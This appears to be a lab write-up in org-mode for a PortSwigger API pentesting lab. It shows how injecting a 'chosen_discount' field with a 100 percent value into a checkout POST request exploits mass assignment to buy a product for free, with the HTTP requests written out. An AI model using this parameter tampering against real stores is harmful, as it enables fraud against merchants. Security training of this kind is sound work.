@@ -1,0 +1,64 @@
+#+title: Exploiting a mass assignment vulnerability
+#+author: [[https://github.com/touhidulshawan][Touhidul Shawan]]
+#+description: API Pentesting Labs from Portswigger
+#+date: 2023-12-18 Mon
+#+options: toc:2
+
+* Table of Contents :toc:
+- [[#lab-contain][Lab contain]]
+  - [[#test-account][Test Account]]
+- [[#end-goal][End Goal]]
+- [[#exploit][Exploit]]
+
+* Lab contain
+** Test Account
+- username: =wiener=
+- password: =peter=
+* End Goal
++ Exploit mass assignment vulnerability
++ Buy =Lightweight l33t Leather Jacket= to solve the lab
+* Exploit
++ Access the lab
++ Login with test account
++ Add a product to cart
++ Click on Place order although don't have any credit. It will give error =Not enough store credit for this purchase=
++ Now observe these flow from http histroy in burpsuite
++ We found a api point with two http method
+
+#+begin_src html
+GET /api/checkout 
+#+end_src
+It gives the checkout product information
+#+begin_src html
+HTTP/2 200 OK
+Content-Type: application/json; charset=utf-8
+X-Content-Type-Options: nosniff
+X-Frame-Options: SAMEORIGIN
+Content-Length: 153
+
+{"chosen_discount":{"percentage":0},"chosen_products":[{"product_id":"1","name":"Lightweight \"l33t\" Leather Jacket","quantity":1,"item_price":133700}]} 
+#+end_src
+
+And a =POST= request
+
+#+begin_src html
+POST /api/checkout HTTP/2
+
+{"chosen_products":[{"product_id":"1","quantity":1}]} 
+#+end_src
+
+This request checkout the product. Send this request to repeater. Add =chosen_discount= property that we can see from the =GET= request. We will change =percentage= for =chosen_discount= to 100 so that we get 100% discount means we can buy the product absolutely free.
+
+#+begin_src html
+  POST /api/checkout HTTP/2  
+  
+  {
+  "chosen_discount":
+    {"percentage":100
+  },
+  "chosen_products":
+    [{"product_id":"1","quantity":1}]}
+#+end_src
+
+Send this request. Make sure to add target product =Lighweight Leather Jacket=. This will checkout the product with 100% discount. Lab solved
+
